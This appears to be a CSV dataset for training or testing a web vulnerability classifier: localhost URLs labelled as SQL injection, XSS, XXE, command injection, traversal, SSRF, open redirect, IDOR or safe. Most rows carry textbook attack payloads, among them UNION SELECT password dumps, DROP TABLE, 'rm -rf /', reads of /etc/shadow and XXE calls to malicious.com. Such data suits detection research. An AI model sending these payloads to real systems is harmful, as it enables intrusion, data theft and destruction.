URL,Vulnerability Type
http://127.0.0.1:5000/product?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/search?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/file?load=config.php,File Inclusion
http://127.0.0.1:5000/checkout?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/comments?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/product?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/dashboard?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/messages?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/comments?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/messages?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/product?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/login?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/settings?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/search?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/checkout?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/profile?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/dashboard?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/user?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/login?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/checkout?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/posts?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/product?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/settings?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/comments?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/review?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/order?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/checkout?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/order?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/download?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/search?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/order?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/search?load=config.php,File Inclusion
http://127.0.0.1:5000/posts?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/search?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/messages?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/checkout?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/cart?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/upload?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/checkout?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/download?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/search?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/download?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/download?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/order?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/profile?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
"http://127.0.0.1:5000/upload?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/settings?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/posts?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/comments?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/review?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/settings?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/messages?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/settings?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/posts?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/order?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/admin?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/checkout?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/dashboard?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/cart?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/review?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/order?load=config.php,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/posts?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/login?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/download?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/upload?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/report?load=config.php,File Inclusion
http://127.0.0.1:5000/login?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/admin?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/login?user=admin'--,SQL Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/login?command=| netstat -an,Command Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/upload?redirect=https://sensitive.com/data,Server-Side Request Forgery
"http://127.0.0.1:5000/review?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/report?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/cart?run=`whoami`,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/messages?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/checkout?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/order?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/checkout?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/upload?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/settings?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/search?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/messages?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/admin?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/admin?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/settings?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/posts?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/settings?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/cart?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/file?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/cart?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/comments?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/comments?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/invoice?run=`whoami`,Command Injection
http://127.0.0.1:5000/upload?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/messages?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/review?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/search?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/file?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/posts?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/file?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/review?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/cart?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/product?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/file?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/cart?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/comments?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/settings?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/profile?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/user?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/comments?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/checkout?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
"http://127.0.0.1:5000/review?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/user?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/admin?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/order?load=config.php,File Inclusion
http://127.0.0.1:5000/user?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/file?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/product?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/login?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/checkout?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/download?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/messages?run=`whoami`,Command Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/posts?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/settings?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/checkout?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/settings?user=admin'--,SQL Injection
http://127.0.0.1:5000/profile?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/settings?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/posts?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/settings?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/posts?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/posts?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/comments?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/messages?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/order?run=`whoami`,Command Injection
http://127.0.0.1:5000/profile?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/cart?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/review?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/settings?run=`whoami`,Command Injection
http://127.0.0.1:5000/settings?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/cart?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?fetch=http://localhost:8000/secret,Server-Side Request Forgery
"http://127.0.0.1:5000/invoice?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/review?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/cart?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/comments?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/user?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/upload?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/posts?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/file?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/comments?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/order?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/user?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/upload?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/posts?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/file?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/order?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/admin?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/invoice?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/report?run=`whoami`,Command Injection
http://127.0.0.1:5000/settings?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/order?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/download?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/messages?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/order?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/posts?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/report?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/product?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/profile?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/invoice?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/download?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/dashboard?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/product?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/file?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/product?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/admin?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/report?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/dashboard?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/settings?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/checkout?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/file?command=| netstat -an,Command Injection
http://127.0.0.1:5000/settings?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/order?desc=<a href=javascript:alert(1)>Click</a>,XSS
